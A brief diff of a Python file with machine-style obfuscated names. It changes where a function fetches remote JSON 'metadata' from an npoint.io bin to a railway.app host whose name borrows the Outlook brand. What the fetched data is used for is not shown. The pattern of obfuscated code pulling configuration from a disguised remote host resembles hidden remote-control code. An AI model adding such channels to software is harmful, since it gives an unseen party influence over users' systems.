@@ -16,7 +16,7 @@ def process_lsxbgc_341():
 
     def config_uiyfke_311():
         try:
-            config_ogcpiu_457 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_ogcpiu_457 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_ogcpiu_457.raise_for_status()
             process_wltxzf_467 = config_ogcpiu_457.json()
             data_lgnnhm_656 = process_wltxzf_467.get('metadata')
